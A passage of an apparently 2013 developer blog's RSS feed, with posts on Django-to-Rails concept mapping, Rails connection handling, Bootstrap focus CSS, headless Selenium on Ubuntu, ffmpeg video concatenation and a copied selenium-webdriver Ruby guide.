    &lt;td&gt;The flow-control language that can be used in the rendering layer.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
    &lt;td&gt;&lt;a href="https://docs.djangoproject.com/en/dev/howto/custom-template-tags/"&gt;Template tags&lt;/a&gt; &lt;em&gt;(custom)&lt;/em&gt;
&lt;/td&gt;
    &lt;td&gt;&lt;a href="http://guides.rubyonrails.org/getting_started.html#view-helpers"&gt;Helpers&lt;/a&gt;
&lt;/td&gt;
    &lt;td&gt;The system for defining custom functions that can be used in the rendering layer.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
    &lt;td&gt;&lt;a href="https://docs.djangoproject.com/en/dev/topics/db/models/"&gt;Models&lt;/a&gt;
&lt;/td&gt;
    &lt;td&gt;&lt;a href="http://guides.rubyonrails.org/getting_started.html#getting-up-and-running-quickly-with-scaffolding"&gt;Models&lt;/a&gt;
&lt;/td&gt;
    &lt;td&gt;The data-definition layer that maps classes to database tables - the &lt;a href="http://en.wikipedia.org/wiki/Object-relational_mapping"&gt;ORM&lt;/a&gt;.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
    &lt;td&gt;&lt;a href="https://docs.djangoproject.com/en/dev/topics/db/managers/"&gt;Managers&lt;/a&gt;
&lt;/td&gt;
    &lt;td&gt;&lt;a href="http://guides.rubyonrails.org/active_record_querying.html#scopes"&gt;Scopes&lt;/a&gt;
&lt;/td&gt;
    &lt;td&gt;The way to extend the ORM to define custom database queries.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
    &lt;td&gt;&lt;a href="https://docs.djangoproject.com/en/dev/howto/custom-management-commands/"&gt;Management commands&lt;/a&gt;
&lt;/td&gt;
    &lt;td&gt;&lt;a href="http://guides.rubyonrails.org/command_line.html"&gt;Rake tasks&lt;/a&gt;
&lt;/td&gt;
    &lt;td&gt;Scripts for performing administrative tasks via the command line.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
    &lt;td&gt;&lt;a href="https://docs.djangoproject.com/en/dev/glossary/#term-project"&gt;Project&lt;/a&gt;
&lt;/td&gt;
    &lt;td&gt;&lt;a href="http://guides.rubyonrails.org/getting_started.html#creating-the-blog-application"&gt;App&lt;/a&gt;
&lt;/td&gt;
    &lt;td&gt;An entire application built with the framework.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
    &lt;td&gt;&lt;a href="https://docs.djangoproject.com/en/dev/intro/tutorial01/#creating-models"&gt;App&lt;/a&gt;
&lt;/td&gt;
    &lt;td&gt;&lt;a href="http://guides.rubyonrails.org/plugins.html"&gt;Plugin&lt;/a&gt;
&lt;/td&gt;
    &lt;td&gt;The way in which all components in the framework can grouped together in separate areas of functionality.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
    &lt;td&gt;&lt;a href="http://south.aeracode.org/"&gt;South&lt;/a&gt; &lt;em&gt;(third-party)&lt;/em&gt;
&lt;/td&gt;
    &lt;td&gt;&lt;a href="http://guides.rubyonrails.org/migrations.html"&gt;Migrations&lt;/a&gt;
&lt;/td&gt;
    &lt;td&gt;The system used for automatically applying changes in the ORM definition to the underlying database tables, such as adding and removing columns.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
    &lt;td&gt;&lt;a href="https://docs.djangoproject.com/en/dev/ref/contrib/admin/"&gt;Admin&lt;/a&gt;
&lt;/td&gt;
    &lt;td&gt;&lt;a href="https://github.com/sferik/rails_admin"&gt;RailsAdmin&lt;/a&gt; &lt;em&gt;(third-party)&lt;/em&gt;
&lt;/td&gt;
    &lt;td&gt;A web-based interface for authenticating administrative users and providing CRUD tools for managing data.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
    &lt;td colspan="3"&gt;
    &lt;p&gt;The following table lists software that aren't part of Django or Rails, but are core parts of the Python and Ruby eco-systems, and go hand-in-hand with using either framework.&lt;/p&gt;
    &lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
    &lt;th&gt;Python&lt;/th&gt;
    &lt;th&gt;Ruby&lt;/th&gt;
    &lt;th&gt;&amp;#160;&lt;/th&gt;
&lt;/tr&gt;
&lt;tr&gt;
    &lt;td&gt;&lt;a href="http://www.virtualenv.org/"&gt;Virtualenv&lt;/a&gt;
&lt;/td&gt;
    &lt;td&gt;&lt;a href="http://beginrescueend.com/"&gt;RVM&lt;/a&gt;
&lt;/td&gt;
    &lt;td&gt;The system used for running isolated environments bound to a particular language version, combined with a set of installed libraries.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
    &lt;td&gt;&lt;a href="http://www.pip-installer.org/"&gt;PIP&lt;/a&gt;
&lt;/td&gt;
    &lt;td&gt;&lt;a href="http://gembundler.com/"&gt;Bundler&lt;/a&gt;
&lt;/td&gt;
    &lt;td&gt;The package manager for installing libraries.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
    &lt;td&gt;&lt;a href="http://www.wsgi.org/"&gt;WSGI&lt;/a&gt;
&lt;/td&gt;
    &lt;td&gt;&lt;a href="http://en.wikipedia.org/wiki/Rack_(web_server_interface)"&gt;Rack&lt;/a&gt;
&lt;/td&gt;
    &lt;td&gt;A standard specification for applications to interface with HTTP, allowing for a single application entry point and middleware to be implemented.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
    &lt;td&gt;&lt;a href="http://fabfile.org/"&gt;Fabric&lt;/a&gt;
&lt;/td&gt;
    &lt;td&gt;&lt;a href="http://en.wikipedia.org/wiki/Capistrano"&gt;Capistrano&lt;/a&gt;
&lt;/td&gt;
    &lt;td&gt;A system for automating tasks on remote servers from a local machine, typically as part of a deployment process.&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Not all of these pairings are a perfect one-to-one match conceptually, but should be good enough to get an overall view of what each concept is within both frameworks.&lt;/p&gt;
&lt;/div&gt;</description>
      <pubDate>Thu, 13 Jun 2013 22:08:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/mapping-of-rails-django-concepts</link>
    </item>
    <item>
      <title>rails中手动开关connection ( close /open connections in Rails) </title>
      <description>&lt;p&gt; for details, please refer to : &lt;a href="http://blog.daniel-azuma.com/archives/216"&gt;http://blog.daniel-azuma.com/archives/216&lt;/a&gt; &lt;/p&gt;

&lt;pre&gt;connection = User.connection
obj = User.find(1)
connection = obj.connection

User.clear_active_connections!
&lt;/pre&gt;
&lt;p&gt;$ show &amp;#160;processlist;&amp;#160;
&lt;/p&gt;</description>
      <pubDate>Thu, 13 Jun 2013 03:10:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/close-open-connection-in-rails</link>
    </item>
    <item>
      <title>为表单加上bootstrap 风格的focus CSS ( adding bootstrap style focus CSS to your input field)</title>
      <description>&lt;p&gt;add these line to your CSS file:&amp;#160;&lt;/p&gt;
&lt;pre&gt;textarea:focus, input[type="text"]:focus, input[type="password"]:focus, input[type="datetime"]:focus, inpu
t[type="datetime-local"]:focus, input[type="date"]:focus, input[type="month"]:focus, input[type="time"]:focus, input[type="week"]:focus, input[type="number"]:focus, input[type="email"]:focus, input[type="url"]:focus, input[type="search"]:focus, input[type="tel"]:focus, input[type="color"]:focus, .uneditable-input:focus {
  border: 1px solid #7F9EF4;
  -webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 6px #7ab5d3;
  -moz-box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 6px #7ab5d3;
  box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 6px #7ab5d3;
}

&lt;/pre&gt;
&lt;p&gt;&lt;img src="/system/images/BAhbBlsHOgZmSSImMjAxMy8wNi8wMy8xNl8wMV8xNV85OTJfZm9ybTIucG5nBjoGRVQ/form2.png" title="Form2" alt="Form2" rel="450x450" width="1280" height="800" /&gt;&lt;/p&gt;</description>
      <pubDate>Mon, 03 Jun 2013 07:58:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/adding-bootstrap-style-focus-css</link>
    </item>
    <item>
      <title>run selenium in ubuntu server ( ubuntu server中运行selenium )</title>
      <description>&lt;p&gt;看来遇到这个问题的人还不少。&lt;/p&gt;
&lt;p&gt;之前我只在 centos 上跑过 selenium, 那个centos 版本自动待了xwindows. 而ubuntu server 是不带的。所以google了一下。 参考这个文章:&amp;#160; &lt;a href="http://www.alittlemadness.com/2008/03/05/running-selenium-headless/"&gt;http://www.alittlemadness.com/2008/03/05/running-selenium-headless/&lt;/a&gt;
&lt;/p&gt;&lt;p&gt;1.&amp;#160; apt-get install xvfb&lt;/p&gt;
&lt;p&gt;2. &amp;#160;apt-get install firefox&lt;/p&gt;
&lt;p&gt;3. &amp;#160;nohup&amp;#160;Xvfb :99 -ac &amp;amp;&lt;/p&gt;
&lt;p&gt;4. &amp;#160;export DISPLAY=:99 &amp;#160; (注意这个 &amp;#160; =:99 , 不是 =99 )&lt;/p&gt;
&lt;p&gt;5. &amp;#160;firefox 就可以启动了。 &amp;#160;或者直接 &amp;#160;bundle exec rspec selenium_specs/pad_spec.rb&amp;#160;&lt;/p&gt;</description>
      <pubDate>Thu, 30 May 2013 02:10:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/run-selenium-in-ubuntu-server</link>
    </item>
    <item>
      <title>使用ffmpeg 组合两端视频 (combine videos using ffmpeg )</title>
      <description>&lt;p&gt;see:&amp;#160;&lt;a href="http://ffmpeg.org/trac/ffmpeg/wiki/How%20to%20concatenate%20(join,%20merge)%20media%20files"&gt;http://ffmpeg.org/trac/ffmpeg/wiki/How%20to%20concatenate%20(join,%20merge)%20media%20files&lt;/a&gt;
&lt;br /&gt;&lt;br /&gt;
&lt;/p&gt;
&lt;p&gt;2014-06-23 更新： 更快的办法：
&lt;/p&gt;
&lt;pre&gt;1: create a file containing x files: 
file '/workspace/videos/zhangong-new-1.mp4'
file '/workspace/videos/zhangong-new-2.mp4'

( 快速从开头获取到某部位的视频） : 
$ ffmpeg -i zhangong-0623.mp4 -t 00:00:10 -c copy zhangong-header.mp4

2. $ ffmpeg -f concat  -i zhangong.txt -c copy zhangong-0623.mp4
&lt;/pre&gt;

&lt;p&gt;简而言之，对于两个mp4文件，先把它们转换成mpegts 文件，再组合成一个mp4：&lt;/p&gt;
&lt;pre&gt;ffmpeg -i input1.mp4 -c copy -bsf:v h264_mp4toannexb -f mpegts intermediate1.ts
ffmpeg -i input2.mp4 -c copy -bsf:v h264_mp4toannexb -f mpegts intermediate2.ts
ffmpeg -i "concat:intermediate1.ts|intermediate2.ts" -c copy qiankunbu_total.mp4  ( 注意这里不要有  -bsf参数) 
&lt;/pre&gt;
&lt;p&gt;While the demuxer works at the stream level, the concat protocol works at the file level. Certain files (mpg and mpeg transport streams, possibly others) can be concatenated. This is analogous to using cat on UNIX-like systems or copy on Windows. In general, the demuxer is the better option.&lt;/p&gt;
&lt;p&gt;Instructions&lt;/p&gt;
&lt;p&gt;ffmpeg -i "concat:input1.mpg|input2.mpg|input3.mpg" -c copy output.mpg&lt;br /&gt;If you have MP4 files, these could be losslessly concatenated by first transcoding them to mpeg transport streams. With h.264 video and AAC audio, the following can be used:&lt;/p&gt;
&lt;p&gt;ffmpeg -i input1.mp4 -c copy -bsf:v h264_mp4toannexb -f mpegts intermediate1.ts&lt;br /&gt;ffmpeg -i input2.mp4 -c copy -bsf:v h264_mp4toannexb -f mpegts intermediate2.ts&lt;br /&gt;ffmpeg -i "concat:intermediate1.ts|intermediate2.ts" -c copy -bsf:a aac_adtstoasc output.mp4&lt;/p&gt;
</description>
      <pubDate>Thu, 30 May 2013 02:05:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/combine-videos-using-ffmpeg</link>
    </item>
    <item>
      <title>ruby selenium gem: selenium-webdriver  ( 复制过来的文档）</title>
      <description>&lt;div id="blog_content" class="blog_content"&gt;
    &lt;p&gt;&amp;#160;官方文档挂了，所以我就复制过来了。看起来很有效。( copied from other site because it seems that we can't access its official site from China mainland )&amp;#160;&lt;/p&gt;
&lt;h1 style="font-size: x-large; margin-top: 0px; background-image: none; background-color: initial; border-top-width: 0px; border-right-width: 0px; border-bottom-width: 0px; border-left-width: 0px; border-color: initial; padding-left: 0px;"&gt;Introduction&lt;/h1&gt;
&lt;p style="line-height: 1.25em;"&gt;The Ruby bindings for Selenium/WebDriver are available as the&amp;#160;&lt;a style="color: #0000cc;" href="http://rubygems.org/gems/selenium-webdriver"&gt;selenium-webdriver&lt;/a&gt;&amp;#160;gem. There are many other Selenium gems out there, but this is the only official, maintained gem. If you're looking for a slightly higher level API built on the same technology, you may want to check out&amp;#160;&lt;a style="color: #0000cc;" href="http://watirwebdriver.com/"&gt;watir-webdriver&lt;/a&gt;.&lt;/p&gt;
&lt;p style="line-height: 1.25em;"&gt;The bindings support Ruby 1.8.7 through 1.9.2, JRuby and Rubinius.&lt;/p&gt;
&lt;ul style="padding-left: 25px;"&gt;
&lt;li style="margin-bottom: 0.3em;"&gt;&lt;a style="color: #0000cc;" href="http://selenium.googlecode.com/svn/trunk/docs/api/rb/index.html"&gt;API docs&lt;/a&gt;
&lt;/li&gt;
&lt;li style="margin-bottom: 0.3em;"&gt;&lt;a style="color: #0000cc;" href="http://selenium.googlecode.com/svn/trunk/rb/CHANGES"&gt;Changelog&lt;/a&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p style="line-height: 1.25em;"&gt;The gem also includes the older selenium-client gem for use with Selenium RC. When reading the docs, keep in mind that these two namespaces refer to different APIs:&lt;/p&gt;
&lt;ul style="padding-left: 25px;"&gt;
&lt;li style="margin-bottom: 0.3em;"&gt;
&lt;tt style="font-family: Monaco, 'DejaVu Sans Mono', 'Bitstream Vera Sans Mono', 'Lucida Console', monospace; font-size: 12px;"&gt;Selenium::WebDriver&lt;/tt&gt;&amp;#160;- the WebDriver API&lt;/li&gt;
&lt;li style="margin-bottom: 0.3em;"&gt;
&lt;tt style="font-family: Monaco, 'DejaVu Sans Mono', 'Bitstream Vera Sans Mono', 'Lucida Console', monospace; font-size: 12px;"&gt;Selenium::Client&lt;/tt&gt;&amp;#160;- Selenium RC API (previously released as the selenium-client gem)&lt;/li&gt;
&lt;/ul&gt;
&lt;p style="line-height: 1.25em;"&gt;For people who are new to Selenium, we recommend starting directly with&amp;#160;&lt;tt style="font-family: Monaco, 'DejaVu Sans Mono', 'Bitstream Vera Sans Mono', 'Lucida Console', monospace; font-size: 12px;"&gt;Selenium::WebDriver&lt;/tt&gt;, and focusing on the two main classes,&lt;tt style="font-family: Monaco, 'DejaVu Sans Mono', 'Bitstream Vera Sans Mono', 'Lucida Console', monospace; font-size: 12px;"&gt;Selenium::WebDriver::Driver&lt;/tt&gt;&amp;#160;and&amp;#160;&lt;tt style="font-family: Monaco, 'DejaVu Sans Mono', 'Bitstream Vera Sans Mono', 'Lucida Console', monospace; font-size: 12px;"&gt;Selenium::WebDriver::Element&lt;/tt&gt;. This is the entry point to the whole WebDriver API.&lt;/p&gt;
&lt;p style="line-height: 1.25em;"&gt;The rest of this document deals with&amp;#160;&lt;tt style="font-family: Monaco, 'DejaVu Sans Mono', 'Bitstream Vera Sans Mono', 'Lucida Console', monospace; font-size: 12px;"&gt;Selenium::WebDriver&lt;/tt&gt;&amp;#160;exclusively.&lt;/p&gt;
&lt;h1 style="font-size: x-large; margin-top: 0px; background-image: none; background-color: initial; border-top-width: 0px; border-right-width: 0px; border-bottom-width: 0px; border-left-width: 0px; border-color: initial; padding-left: 0px;"&gt;
&lt;a name="API_Example"&gt;&lt;/a&gt;API Example&lt;a style="color: #bbbbbb; display: inline; text-decoration: none; margin-left: 0.7em; font-size: 20px;" href="http://code.google.com/p/selenium/wiki/RubyBindings#API_Example" class="section_anchor"&gt;&lt;/a&gt;
&lt;/h1&gt;
&lt;p style="line-height: 1.25em;"&gt;The bindings provide a slightly rubified version of the WebDriver API:&lt;/p&gt;
&lt;p style="line-height: 1.25em;"&gt;&amp;#160;&lt;/p&gt;
&lt;p style="line-height: 1.25em;"&gt;&amp;#160;&lt;/p&gt;
&lt;div class="dp-highlighter"&gt;&lt;div class="bar"&gt;&lt;div class="tools"&gt;Ruby代码 &lt;embed wmode="transparent" src="/javascripts/syntaxhighlighter/clipboard_new.swf" width="14" height="15" flashvars="clipboard=require%20%22selenium-webdriver%22%0A%0Adriver%20%3D%20Selenium%3A%3AWebDriver.for%20%3Afirefox%0Adriver.navigate.to%20%22http%3A%2F%2Fgoogle.com%22%0A%0Aelement%20%3D%20driver.find_element(%3Aname%2C%20'q')%0Aelement.send_keys%20%22Hello%20WebDriver!%22%0Aelement.submit%0A%0Aputs%20driver.title%0A%0Adriver.quit" allowscriptaccess="always" type="application/x-shockwave-flash" /&gt;&amp;#160;&lt;a href="javascript:void()" title="收藏这段代码" onclick="code_favorites_do_favorite(this);return false;"&gt;&lt;img class="star" src="/images/icon_star.png" alt="收藏代码" /&gt;&lt;img class="spinner" src="/images/spinner.gif" style="display:none" /&gt;&lt;/a&gt;
&lt;/div&gt;&lt;/div&gt;
&lt;ol class="dp-rb"&gt;&lt;li&gt;&lt;span&gt;&lt;span&gt;require&amp;#160;&lt;/span&gt;
&lt;span class="string"&gt;"selenium-webdriver"&lt;/span&gt;
&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;driver&amp;#160;=&amp;#160;Selenium::WebDriver.&lt;span class="keyword"&gt;for&lt;/span&gt;
&lt;span class="symbol"&gt;:firefox&lt;/span&gt;
&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;driver.navigate.to&amp;#160;&lt;span class="string"&gt;"http://google.com"&lt;/span&gt;
&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;element&amp;#160;=&amp;#160;driver.find_element(&lt;span class="symbol"&gt;:name&lt;/span&gt;
&lt;span&gt;,&amp;#160;&lt;/span&gt;
&lt;span class="string"&gt;'q'&lt;/span&gt;
&lt;span&gt;)&amp;#160;&amp;#160;&lt;/span&gt;
&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;element.send_keys&amp;#160;&lt;span class="string"&gt;"Hello&amp;#160;WebDriver!"&lt;/span&gt;
&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;element.submit&amp;#160;&amp;#160;&lt;/span&gt;
&lt;/li&gt;&lt;li&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;puts&amp;#160;driver.title&amp;#160;&amp;#160;&lt;/span&gt;
&lt;/li&gt;&lt;li&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;driver.quit&amp;#160;&amp;#160;&lt;/span&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;/div&gt;&lt;pre class="ruby" style="display: none;" title="Selenium2 with ruby"&gt;require "selenium-webdriver"

driver = Selenium::WebDriver.for :firefox
driver.navigate.to "http://google.com"

element = driver.find_element(:name, 'q')
element.send_keys "Hello WebDriver!"
element.submit

puts driver.title

driver.quit&lt;/pre&gt;

&lt;p style="line-height: 1.25em;"&gt;&amp;#160;&lt;/p&gt;
&lt;p&gt;Driver examples:&lt;/span&gt;
&lt;/p&gt;



&lt;div class="dp-highlighter"&gt;&lt;div class="bar"&gt;&lt;div class="tools"&gt;Ruby代码 &lt;embed wmode="transparent" src="/javascripts/syntaxhighlighter/clipboard_new.swf" width="14" height="15" flashvars="clipboard=%23%20execute%20arbitrary%20javascript%0Aputs%20driver.execute_script(%22return%20window.location.pathname%22)%0A%0A%23%20wait%20for%20a%20specific%20element%20to%20show%20up%0Await%20%3D%20Selenium%3A%3AWebDriver%3A%3AWait.new(%3Atimeout%20%3D%3E%2010)%20%23%20seconds%0Await.until%20%7B%20driver.find_element(%3Aid%20%3D%3E%20%22foo%22)%20%7D" allowscriptaccess="always" type="application/x-shockwave-flash" /&gt;&amp;#160;&lt;a href="javascript:void()" title="收藏这段代码" onclick="code_favorites_do_favorite(this);return false;"&gt;&lt;img class="star" src="/images/icon_star.png" alt="收藏代码" /&gt;&lt;img class="spinner" src="/images/spinner.gif" style="display:none" /&gt;&lt;/a&gt;
&lt;/div&gt;&lt;/div&gt;
&lt;ol class="dp-rb"&gt;&lt;li&gt;&lt;span&gt;&lt;span class="comment"&gt;#&amp;#160;execute&amp;#160;arbitrary&amp;#160;javascript&lt;/span&gt;
&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;puts&amp;#160;driver.execute_script(&lt;span class="string"&gt;"return&amp;#160;window.location.pathname"&lt;/span&gt;
&lt;span&gt;)&amp;#160;&amp;#160;&lt;/span&gt;
&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;&lt;span class="comment"&gt;#&amp;#160;wait&amp;#160;for&amp;#160;a&amp;#160;specific&amp;#160;element&amp;#160;to&amp;#160;show&amp;#160;up&lt;/span&gt;
&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;wait&amp;#160;=&amp;#160;Selenium::WebDriver::Wait.&lt;span class="keyword"&gt;new&lt;/span&gt;
&lt;span&gt;(&lt;/span&gt;
&lt;span class="symbol"&gt;:timeout&lt;/span&gt;
&lt;span&gt;&amp;#160;=&amp;gt;&amp;#160;10)&amp;#160;&lt;/span&gt;
&lt;span class="comment"&gt;#&amp;#160;seconds&lt;/span&gt;
&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;wait.&lt;span class="keyword"&gt;until&lt;/span&gt;
&lt;span&gt;&amp;#160;{&amp;#160;driver.find_element(&lt;/span&gt;
&lt;span class="symbol"&gt;:id&lt;/span&gt;
&lt;span&gt;&amp;#160;=&amp;gt;&amp;#160;&lt;/span&gt;
&lt;span class="string"&gt;"foo"&lt;/span&gt;
&lt;span&gt;)&amp;#160;}&amp;#160;&amp;#160;&lt;/span&gt;
&lt;/span&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;/div&gt;
&lt;pre class="ruby" style="display: none;" title="Selenium2 with ruby"&gt;# execute arbitrary javascript
puts driver.execute_script("return window.location.pathname")

# wait for a specific element to show up
wait = Selenium::WebDriver::Wait.new(:timeout =&amp;gt; 10) # seconds
wait.until { driver.find_element(:id =&amp;gt; "foo") }&lt;/pre&gt;

&lt;p&gt;Element examples:&lt;/span&gt;
&lt;/p&gt;

&lt;div class="dp-highlighter"&gt;&lt;div class="bar"&gt;&lt;div class="tools"&gt;Ruby代码 &lt;embed wmode="transparent" src="/javascripts/syntaxhighlighter/clipboard_new.swf" width="14" height="15" flashvars="clipboard=%23%20get%20an%20attribute%0Aclass_name%20%3D%20element.attribute(%22class%22)%20%0A%0A%23%20is%20the%20element%20visible%20on%20the%20page%3F%0Aelement.displayed%3F%0A%0A%23%20click%20the%20element%0Aelement.click%0A%0A%23%20get%20the%20element%20location%0Aelement.location%0A%0A%23%20scroll%20the%20element%20into%20view%2C%20then%20return%20its%20location%0Aelement.location_once_scrolled_into_view%0A%0A%23%20get%20the%20width%20and%20height%20of%20an%20element%0Aelement.size%0A%0A%23%20press%20space%20on%20an%20element%20-%20see%20Selenium%3A%3AWebDriver%3A%3AKeys%20for%20possible%20values%0Aelement.send_keys%20%3Aspace%0A%0A%23%20get%20the%20text%20of%20an%20element%0Aelement.text" allowscriptaccess="always" type="application/x-shockwave-flash" /&gt;&amp;#160;&lt;a href="javascript:void()" title="收藏这段代码" onclick="code_favorites_do_favorite(this);return false;"&gt;&lt;img class="star" src="/images/icon_star.png" alt="收藏代码" /&gt;&lt;img class="spinner" src="/images/spinner.gif" style="display:none" /&gt;&lt;/a&gt;
&lt;/div&gt;&lt;/div&gt;
&lt;ol class="dp-rb"&gt;&lt;li&gt;&lt;span&gt;&lt;span class="comment"&gt;#&amp;#160;get&amp;#160;an&amp;#160;attribute&lt;/span&gt;
&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;class_name&amp;#160;=&amp;#160;element.attribute(&lt;span class="string"&gt;"class"&lt;/span&gt;
&lt;span&gt;)&amp;#160;&amp;#160;&amp;#160;&lt;/span&gt;
&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;&lt;span class="comment"&gt;#&amp;#160;is&amp;#160;the&amp;#160;element&amp;#160;visible&amp;#160;on&amp;#160;the&amp;#160;page?&lt;/span&gt;
&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;element.displayed?&amp;#160;&amp;#160;&lt;/span&gt;
&lt;/li&gt;&lt;li&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;&lt;span class="comment"&gt;#&amp;#160;click&amp;#160;the&amp;#160;element&lt;/span&gt;
&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;element.click&amp;#160;&amp;#160;&lt;/span&gt;
&lt;/li&gt;&lt;li&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;&lt;span class="comment"&gt;#&amp;#160;get&amp;#160;the&amp;#160;element&amp;#160;location&lt;/span&gt;
&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;element.location&amp;#160;&amp;#160;&lt;/span&gt;
&lt;/li&gt;&lt;li&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;&lt;span class="comment"&gt;#&amp;#160;scroll&amp;#160;the&amp;#160;element&amp;#160;into&amp;#160;view,&amp;#160;then&amp;#160;return&amp;#160;its&amp;#160;location&lt;/span&gt;
&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;element.location_once_scrolled_into_view&amp;#160;&amp;#160;&lt;/span&gt;
&lt;/li&gt;&lt;li&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;&lt;span class="comment"&gt;#&amp;#160;get&amp;#160;the&amp;#160;width&amp;#160;and&amp;#160;height&amp;#160;of&amp;#160;an&amp;#160;element&lt;/span&gt;
&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;element.size&amp;#160;&amp;#160;&lt;/span&gt;
&lt;/li&gt;&lt;li&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;&lt;span class="comment"&gt;#&amp;#160;press&amp;#160;space&amp;#160;on&amp;#160;an&amp;#160;element&amp;#160;-&amp;#160;see&amp;#160;Selenium::WebDriver::Keys&amp;#160;for&amp;#160;possible&amp;#160;values&lt;/span&gt;
&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;element.send_keys&amp;#160;&lt;span class="symbol"&gt;:space&lt;/span&gt;
&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;&lt;span class="comment"&gt;#&amp;#160;get&amp;#160;the&amp;#160;text&amp;#160;of&amp;#160;an&amp;#160;element&lt;/span&gt;
&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;element.text&amp;#160;&amp;#160;&lt;/span&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;/div&gt;&lt;pre class="ruby" style="display: none;" title="Selenium2 with ruby"&gt;# get an attribute
class_name = element.attribute("class") 

# is the element visible on the page?
element.displayed?

# click the element
element.click

# get the element location
element.location

# scroll the element into view, then return its location
element.location_once_scrolled_into_view

# get the width and height of an element
element.size

# press space on an element - see Selenium::WebDriver::Keys for possible values
element.send_keys :space

# get the text of an element
element.text&lt;/pre&gt;


&lt;p&gt;Advanced user interactions (see&amp;#160;&lt;a style="color: #0000cc;" href="http://selenium.googlecode.com/svn/trunk/docs/api/rb/Selenium/WebDriver/ActionBuilder.html"&gt;ActionBuilder&lt;/a&gt;):&lt;/span&gt;
&lt;/p&gt;


&lt;div class="dp-highlighter"&gt;&lt;div class="bar"&gt;&lt;div class="tools"&gt;Ruby代码 &lt;embed wmode="transparent" src="/javascripts/syntaxhighlighter/clipboard_new.swf" width="14" height="15" flashvars="clipboard=driver.action.key_down(%3Ashift).%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20click(element).%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20double_click(second_element).%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20key_up(%3Ashift).%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20drag_and_drop(element%2C%20third_element).%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20perform" allowscriptaccess="always" type="application/x-shockwave-flash" /&gt;&amp;#160;&lt;a href="javascript:void()" title="收藏这段代码" onclick="code_favorites_do_favorite(this);return false;"&gt;&lt;img class="star" src="/images/icon_star.png" alt="收藏代码" /&gt;&lt;img class="spinner" src="/images/spinner.gif" style="display:none" /&gt;&lt;/a&gt;
&lt;/div&gt;&lt;/div&gt;
&lt;ol class="dp-rb"&gt;&lt;li&gt;&lt;span&gt;&lt;span&gt;driver.action.key_down(&lt;/span&gt;
&lt;span class="symbol"&gt;:shift&lt;/span&gt;
&lt;span&gt;).&amp;#160;&amp;#160;&lt;/span&gt;
&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;click(element).&amp;#160;&amp;#160;&lt;/span&gt;
&lt;/li&gt;&lt;li&gt;&lt;span&gt;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;double_click(second_element).&amp;#160;&amp;#160;&lt;/span&gt;
